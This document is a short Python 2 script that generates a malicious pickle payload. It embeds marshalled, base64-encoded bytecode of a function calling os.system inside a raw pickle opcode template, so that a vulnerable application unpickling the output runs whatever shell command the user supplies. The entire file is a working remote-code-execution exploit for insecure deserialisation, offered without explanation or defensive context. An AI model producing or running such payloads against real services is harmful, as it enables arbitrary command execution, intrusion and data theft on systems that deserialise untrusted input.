import marshal
import base64
import sys
 
PAYLOAD_TEMPLATE = '''ctypes
FunctionType
(cmarshal
loads
(cbase64
b64decode
(S'%s'
tRtRc__builtin__
globals
(tRS''
tR(S'%s'
tR.'''
 
def create_payload(cmd):
  def execute(c):
    import os
    os.system(c)
  m = marshal.dumps(execute.func_code)
  return PAYLOAD_TEMPLATE % (base64.b64encode(m), cmd)

if __name__ == "__main__":
    cmd = sys.argv[1]
    payload = create_payload(cmd)
    print payload
    
